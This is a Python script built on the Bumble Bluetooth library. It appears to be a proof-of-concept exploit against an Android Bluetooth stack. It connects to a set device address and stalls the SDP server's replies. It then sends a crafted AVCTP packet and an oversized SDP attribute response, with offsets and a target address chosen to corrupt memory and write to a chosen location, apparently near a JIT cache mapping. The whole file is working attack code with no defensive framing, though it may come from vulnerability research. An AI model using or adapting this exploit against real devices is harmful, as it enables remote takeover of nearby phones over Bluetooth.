import asyncio
import struct

import bumble.logging
from bumble import core, hci, rfcomm, transport, utils, hfp, sdp, avrcp
from bumble.colors import color
from bumble.device import Connection, Device, DeviceConfiguration
from bumble.l2cap import ClassicChannelSpec

hci_transport = "android-netsim"
device_config = "device.json"
address = "DA:4C:10:DE:17:00"

# copied from Bumble's examples/run_hfp_gateway.py


def _default_configuration() -> hfp.AgConfiguration:
    return hfp.AgConfiguration(
        supported_ag_features=[
            hfp.AgFeature.HF_INDICATORS,
            hfp.AgFeature.IN_BAND_RING_TONE_CAPABILITY,
            hfp.AgFeature.REJECT_CALL,
            hfp.AgFeature.CODEC_NEGOTIATION,
            hfp.AgFeature.ESCO_S4_SETTINGS_SUPPORTED,
            hfp.AgFeature.ENHANCED_CALL_STATUS,
        ],
        supported_ag_indicators=[
            hfp.AgIndicatorState.call(),
            hfp.AgIndicatorState.callsetup(),
            hfp.AgIndicatorState.callheld(),
            hfp.AgIndicatorState.service(),
            hfp.AgIndicatorState.signal(),
            hfp.AgIndicatorState.roam(),
            hfp.AgIndicatorState.battchg(),
        ],
        supported_hf_indicators=[
            hfp.HfIndicator.ENHANCED_SAFETY,
            hfp.HfIndicator.BATTERY_LEVEL,
        ],
        supported_ag_call_hold_operations=[],
        supported_audio_codecs=[hfp.AudioCodec.CVSD, hfp.AudioCodec.MSBC],
    )


def AvctMakePacket(transaction_label, packet_type, is_command, ipid, pid,
                   payload):
    return (struct.pack(
        ">BH",
        transaction_label << 4
        | packet_type << 2
        | (0 if is_command else 1) << 1
        | (1 if ipid else 0),
        pid,
    ) + payload)


async def main():
    bumble.logging.setup_basic_logging("INFO")
    async with await transport.open_transport(hci_transport) as (
            hci_source,
            hci_sink,
    ):
        device = Device.from_config_file_with_hci(device_config, hci_source,
                                                  hci_sink)
        device.classic_enabled = True
        configuration = _default_configuration()

        ag_sdp_record_handle = 0x00010001
        avrcp_controller_service_record_handle = 0x00010002
        avrcp_target_service_record_handle = 0x00010003

        device.sdp_service_records = {
            ag_sdp_record_handle:
            hfp.make_ag_sdp_records(1, ag_sdp_record_handle, configuration),
            avrcp_controller_service_record_handle:
            avrcp.make_controller_service_sdp_records(
                avrcp_controller_service_record_handle),
            avrcp_target_service_record_handle:
            avrcp.make_target_service_sdp_records(
                avrcp_controller_service_record_handle),
        }

        requests = []

        await device.power_on()
        connection = await device.connect(
            address, transport=core.PhysicalTransport.BR_EDR)
        await connection.encrypt()

        hfp_record = await hfp.find_hf_sdp_record(connection)
        if hfp_record is None:
            print("target device doesn't support Headset Client")
            return
        hfp_channel_id = hfp_record[0]

        avrcp_protocol = avrcp.Protocol()
        avrcp_protocol.listen(device)
        await avrcp_protocol.connect(connection)

        # TODO(zhuowei): wait for EVENT_CONNECTION instead
        await asyncio.sleep(1)

        def my_hook(request_):
            print("got SDP, doing NOTHING", request_)
            requests.append(request_)

        device.sdp_server.orig_on_sdp_service_search_attribute_request = device.sdp_server.on_sdp_service_search_attribute_request
        device.sdp_server.on_sdp_service_search_attribute_request = my_hook

        rfcomm_client = rfcomm.Client(connection)
        rfcomm_mux = await rfcomm_client.start()

        async def do_write(target_address, target_buffer):
            requests.clear()
            channel = await rfcomm_mux.open_dlc(hfp_channel_id)
            print("open dlc!!!!!!!")
            await asyncio.sleep(0.5)
            await channel.disconnect()
            await asyncio.sleep(0.5)
            channel = await rfcomm_mux.open_dlc(hfp_channel_id)
            await asyncio.sleep(0.5)
            device.sdp_server.send_response(
                sdp.SDP_ErrorResponse(
                    transaction_id=requests[0].transaction_id,
                    error_code=sdp.SDP_INVALID_SERVICE_RECORD_HANDLE_ERROR,
                ))
            await asyncio.sleep(0.5)
            # with 0xef as my filler:
            # 0000  00 00 02 01 0b 01 01 00 19 00 07 01 03 01 75 00   ..............u.
            # 0010  06 06 41 ef ef ef ef ef ef ef ef ef ef ef ef ef   ..A.............
            buf_offset = 0x13
            tSDP_DISCOVERY_DB_raw_data_offset = 0x70
            # raw_data, raw_size, raw_used
            avrcp_command_buf = b"A" * (
                tSDP_DISCOVERY_DB_raw_data_offset - buf_offset) + struct.pack(
                    "<QII", target_address, 0x41414141, 0x0) + b"\xef" * 0x80
            avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
                AvctMakePacket(0, avrcp.Protocol.PacketType.START, False,
                               False, 0x4141, avrcp_command_buf))
            sdp_attribute_list = bytes(sdp.DataElement.sequence([b"A" * 0x100
                                                                 ]))
            device.sdp_server.send_response(
                sdp.SDP_ServiceSearchAttributeResponse(
                    transaction_id=requests[1].transaction_id,
                    attribute_lists_byte_count=len(sdp_attribute_list),
                    attribute_lists=sdp_attribute_list,
                    continuation_state=bytes([0])))
            await asyncio.sleep(0.5)
            avrcp_protocol.avctp_protocol.send_response(0, 0x4141, b"A")
            await channel.disconnect()
            await asyncio.sleep(0.5)

        # 76ccc61000-76d0c61000 rw-s 00000000 00:01 5731                           /memfd:jit-cache (deleted)
        await do_write(0x7265f47000 + 0x2000000 + 0x2000, b"A" * 0x800)


asyncio.run(main())
